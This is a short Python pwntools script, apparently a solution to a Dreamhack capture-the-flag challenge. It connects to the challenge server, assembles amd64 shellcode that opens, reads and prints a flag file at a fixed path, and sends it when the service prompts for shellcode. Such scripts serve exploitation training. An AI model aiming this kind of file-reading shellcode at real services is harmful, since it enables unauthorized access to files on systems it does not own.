from pwn import *

context.arch = "amd64"
p = remote("host3.dreamhack.games", 24520)

r = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(r)
shellcode += shellcraft.read("rax", "rsp", 0x30)
shellcode += shellcraft.write(1, "rsp", 0x30)
shellcode = asm(shellcode)

p.sendlineafter('shellcode: ', shellcode)

print(p.recvuntil(b'}'))
